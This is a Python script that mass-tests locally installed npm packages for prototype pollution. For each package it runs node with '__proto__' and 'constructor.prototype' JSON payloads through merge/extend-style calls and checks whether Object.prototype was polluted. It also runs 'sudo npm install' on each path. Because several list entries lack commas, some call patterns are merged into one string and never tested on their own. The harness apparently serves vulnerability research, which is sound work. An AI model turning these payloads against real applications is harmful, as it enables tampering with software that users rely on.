#!/usr/bin/env python3
import re
import subprocess
import os
from subprocess import TimeoutExpired

checked = 0
success = 0
failed = 0
for line in open('npmsuccess.log').readlines():
    checked += 1
    # if checked < 367:
    #     continue
    match = re.match(r'^(.*) successfully found in (.*)$', line)
    if match:
        path = match.group(2)
        print(path)
        if not os.path.exists(f"{path}/node_modules"):
            os.system(f'cd "{path}" && sudo npm install > /dev/null 2>&1')
        base_script = f"var a = require('{path}');"
        payloads = [
            r"""var payload = JSON.parse('{"__proto__": {"toString": true}}');""",
            r"""var payload = JSON.parse('{"constructor": {"prototype": {"toString": true}}}');"""
        ]
        exploits = [
            r"a({}, payload);",
            r"a.merge({}, payload);"
            r"a.extend({}, payload);"
            r"a.deep({}, payload);"
            r"a.recursive({}, payload);"
            r"a.mergeWith({}, payload);",
            r"a(true, {}, payload);",
        ]
        check = r"console.log(({}).toString);"
        successful = False
        for i, payload in enumerate(payloads):
            for j, exploit in enumerate(exploits):
                # print(f'Trying payload {i} and exploit {j}... ', end='')
                script = base_script + payload + exploit + check
                # print(script)
                proc = subprocess.Popen(['node', '-e', script], text=True,
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
                try:
                    stdout, stderr = proc.communicate(timeout=10)
                    # print(stdout)
                    # print(stderr)
                except TimeoutExpired as e:
                    print(e)
                if len(stderr) > 0:
                    pass
                    # print('An error occurred, failed.')
                elif stdout.strip() == 'true':
                    print(f'Success with payload {i} and exploit {j}!')
                    success += 1
                    successful = True
                    break
        if not successful:
            failed += 1
        print(f'{checked} checked, {success} success, {failed} failed')